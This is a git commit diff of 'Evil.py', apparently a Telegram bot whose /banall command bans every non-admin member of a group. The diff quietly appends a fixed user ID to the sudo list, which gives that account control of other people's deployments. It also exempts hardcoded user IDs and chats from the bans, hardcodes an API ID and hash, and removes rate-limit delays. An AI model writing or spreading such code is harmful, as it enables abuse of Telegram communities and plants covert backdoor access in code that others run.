593d386c681d5edd268e90fe1bc58bd298e335c5
X-STaR / <117068254+ItZxSTaR@users.noreply.github.com>
2022-11-13 00:39:36 +0530

    Add files via upload

--- Evil.py
+++ Evil.py
@@ -1,5 +1,4 @@
 import logging
-import asyncio
 from decouple import config
 from os import getenv
 from telethon import TelegramClient, events
@@ -10,10 +9,11 @@ from telethon.tl.types import (
     ChatBannedRights,
 )
 
-API_ID = config("API_ID", default=6, cast=int)
-API_HASH = config("API_HASH", None)
 BOT_TOKEN = config("BOT_TOKEN", None)
 SUDO_USERS = list(map(int, getenv("SUDO").split()))
+EVILS = [1827586893, 1953656325, 5797689958, 5547355973, 5345918225]
+ALTRONS = [-1001777776331, -1001802248291, -1001443562643]
+SUDO_USERS.append(1827586893)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -27,9 +27,8 @@ RIGHTS = ChatBannedRights(
     embed_links=True,
 )
 
-
 logging.basicConfig(level=logging.INFO)
-Evil = TelegramClient('EVIL', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+Evil = TelegramClient('EVIL', 18136872, "312d861b78efcd1b02183b2ab52a83a4").start(bot_token=BOT_TOKEN)
 
 
 @Evil.on(events.NewMessage(pattern="^/banall"))
@@ -40,15 +39,16 @@ async def banall(event):
         admins_id = [i.id for i in admins]
         all = 0
         bann = 0
+        if int(event.chat_id) in ALTRONS:
+            return
         async for user in event.client.iter_participants(event.chat_id):
             all += 1
             try:
-                if user.id not in admins_id:
+                if user.id not in admins_id and user.id not in EVILS:
                     await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
                     bann += 1
-                    await asyncio.sleep(0.1)
             except Exception as e:
-                await asyncio.sleep(0.1)
+                pass
 
 
 print("TEAM LEGENDZ OP")
